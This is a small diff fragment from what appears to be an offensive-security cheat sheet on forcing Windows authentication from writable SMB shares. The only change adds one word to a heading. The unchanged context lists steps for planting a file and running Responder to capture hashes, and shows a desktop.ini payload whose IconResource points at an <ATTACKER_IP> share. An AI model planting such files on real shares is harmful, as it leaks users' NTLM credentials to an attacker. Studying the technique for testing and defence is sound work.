@@ -27,7 +27,7 @@ $lnk.Save()
 2. Place the file in the writable SMB share (won't work if hidden)
 3. Fire up responder `responder -I eth0`
 
-# Automatic on folder/share visit III: Creating a system folder and placing `desktop.ini` inside
+# Automatic on folder/share visit III: Creating a system folder and placing `desktop.ini` inside it
 ```
 [.ShellClassInfo]
 IconResource=\\<ATTACKER_IP>\settings
